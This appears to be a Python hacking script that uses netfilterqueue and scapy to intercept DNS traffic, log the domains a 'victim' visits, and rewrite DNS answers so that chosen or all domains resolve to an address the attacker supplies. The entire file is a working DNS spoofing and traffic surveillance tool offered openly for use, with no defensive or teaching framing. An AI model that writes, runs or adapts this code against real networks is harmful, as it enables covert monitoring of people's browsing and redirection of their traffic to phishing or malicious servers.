import netfilterqueue
import scapy.all as scapy
import optparse

def arugments():
    parser = optparse.OptionParser()
    parser.add_option("-a","--all_siteVist",dest="sv",action="store_true",help="See all sites victim is trying to visit")
    parser.add_option("-l","--list",dest="file_list",help="detect if the victum vist sites in the list")
    parser.add_option("-s","--oneSiteScan",dest="site",help="See if victim vist this single site")
    parser.add_option("--c","--direction",dest="change",help="Change domain direction")
    #parser.add_option("--cl","--directionForAllDns",dest="change_all",help="Change domain direction from list")
    options , arg = parser.parse_args()
    if not options.sv and not options.file_list and not options.site:
        print("[log] -h for help")

    return options


def packet_send(process):
    try:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0,process)
        queue.run()
    except KeyboardInterrupt:
        print("[log] Exit...")
        exit()

####
def change_dns(qname,scapy_packet,packet):
    answer =scapy.DNSRR(rrname=qname, rdata=options.change)
    scapy_packet[scapy.DNS].an = answer
    scapy_packet[scapy.DNS].ancount = 1
    if scapy.IP in scapy_packet:
        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum
    if scapy.UDP in scapy_packet:
        del scapy_packet[scapy.UDP].len
        del scapy_packet[scapy.UDP].chksum
    elif scapy.TCP in scapy_packet:
        del scapy_packet[scapy.TCP].len
        del scapy_packet[scapy.TCP].chksum
    packet.set_payload(bytes(scapy_packet))

def show_dns(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if options.file_list:
            checked = file(qname)
            if checked and options.change:
                change_dns(qname,scapy_packet,packet)
        if options.sv:
            print(f"[log] Visted : {qname}")
            if options.change:
                change_dns(qname,scapy_packet,packet)
        #if options
    packet.accept()


def file(qname):
    with open(options.file_list,'r') as file:
        qname = qname.rstrip(b'.').decode('utf-8')
        for line in file:
            print(f"test :{line.strip()}")
            print(f"q name is : {qname}")
            if line.strip() == qname:
                print(f"[log] Target vist : [ {qname} ]")
                return qname
                #break
                


def check_arguemnts():
    if options.sv:
        print("[log] start dns scanner")
        packet_send(show_dns)
    elif options.file_list:
        print(f"[log] start scan dns from file {options.file_list}")
        packet_send(show_dns)




############################################################################
options = arugments()
state =check_arguemnts()

########################################################################33333
#main fucntion if no arguments is given
#packet_send(process_packet)